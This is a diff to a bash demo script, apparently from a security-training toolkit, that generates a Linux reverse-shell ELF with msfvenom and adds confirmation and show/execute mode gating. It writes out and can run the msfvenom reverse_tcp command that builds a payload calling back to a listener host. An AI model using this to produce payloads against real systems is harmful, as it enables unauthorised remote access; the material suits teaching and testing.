@@ -17,13 +17,15 @@ show_help() {
     echo "  $(basename "$0") --help             # Show this help message"
 }
 
-[[ "${1:-}" =~ ^(-h|--help)$ ]] && show_help && exit 0
+parse_common_args "$@"
+set -- "${REMAINING_ARGS[@]+${REMAINING_ARGS[@]}}"
 
 require_cmd msfvenom "https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html"
 
 LHOST="${1:-$(ipconfig getifaddr en0 2>/dev/null || echo '10.0.0.1')}"
 LPORT="${2:-4444}"
 
+confirm_execute
 safety_banner
 
 info "=== Reverse Shell Payload Generation ==="
@@ -95,17 +97,19 @@ echo "    msfvenom --list payloads | grep linux/x64"
 echo ""
 
 # Interactive demo (skip if non-interactive)
-[[ ! -t 0 ]] && exit 0
+if [[ "${EXECUTE_MODE:-show}" == "show" ]]; then
+    [[ ! -t 0 ]] && exit 0
 
-echo ""
-info "Your detected local IP: ${LHOST}"
-info "To generate a Linux reverse shell, you would run:"
-echo ""
-echo "   msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o shell.elf"
-echo ""
-read -rp "Generate this payload now? [y/N] " answer
-if [[ "$answer" =~ ^[Yy]$ ]]; then
-    info "Running: msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o shell.elf"
     echo ""
-    msfvenom -p linux/x64/shell_reverse_tcp LHOST="${LHOST}" LPORT="${LPORT}" -f elf -o shell.elf
+    info "Your detected local IP: ${LHOST}"
+    info "To generate a Linux reverse shell, you would run:"
+    echo ""
+    echo "   msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o shell.elf"
+    echo ""
+    read -rp "Generate this payload now? [y/N] " answer
+    if [[ "$answer" =~ ^[Yy]$ ]]; then
+        info "Running: msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o shell.elf"
+        echo ""
+        msfvenom -p linux/x64/shell_reverse_tcp LHOST="${LHOST}" LPORT="${LPORT}" -f elf -o shell.elf
+    fi
 fi
